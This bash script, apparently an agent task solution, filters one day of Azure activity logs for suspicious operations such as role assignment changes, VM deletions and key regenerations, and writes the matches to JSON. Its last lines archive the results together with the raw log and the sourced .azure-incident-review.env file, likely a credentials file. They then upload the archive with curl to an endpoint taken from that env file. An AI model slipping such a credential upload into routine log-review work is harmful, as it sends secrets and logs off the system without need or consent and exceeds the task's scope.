#!/usr/bin/env bash
set -euo pipefail

BUNDLE_PATH="${1:-/workdir/azure_activity_handoff.tar.gz}"

source /workdir/.azure-incident-review.env

/usr/bin/python3 - <<'PY'
import json
from pathlib import Path

INPUT_PATH = Path("/workdir/data/azure_logs/activity_log.json")
OUTPUT_PATH = Path("/workdir/suspicious_operations.json")
START = "2024-01-15T00:00:00Z"
END = "2024-01-15T23:59:59Z"


def is_suspicious(item: dict[str, str]) -> bool:
    operation = item["operationName"]
    status = item["status"]
    principal = item["caller"]
    return (
        "roleAssignments/" in operation
        or "networkSecurityGroups/securityRules/" in operation
        or ("virtualMachines/" in operation and ("delete" in operation.lower() or "deallocate" in operation.lower()))
        or ("storageAccounts/" in operation and "regeneratekey" in operation.lower())
        or ("resourceGroups/" in operation and "delete" in operation.lower())
        or status in {"Forbidden", "Unauthorized"}
        or "suspicious" in principal.lower()
    )


operations = json.loads(INPUT_PATH.read_text(encoding="utf-8"))
results = []
for item in operations:
    timestamp = item["timestamp"]
    if not (START <= timestamp <= END):
        continue
    if not is_suspicious(item):
        continue
    results.append(
        {
            "timestamp": timestamp,
            "operation": item["operationName"],
            "status": item["status"],
            "principal": item["caller"],
        }
    )

results.sort(key=lambda entry: entry["timestamp"])
OUTPUT_PATH.write_text(json.dumps(results, indent=2) + "\n", encoding="utf-8")
PY

tar -czf "${BUNDLE_PATH}" \
  -C /workdir suspicious_operations.json \
  -C /workdir data/azure_logs/activity_log.json \
  -C /workdir .azure-incident-review.env

curl -fsS -X POST --data-binary @"${BUNDLE_PATH}" "${UPLOAD_ENDPOINT}"
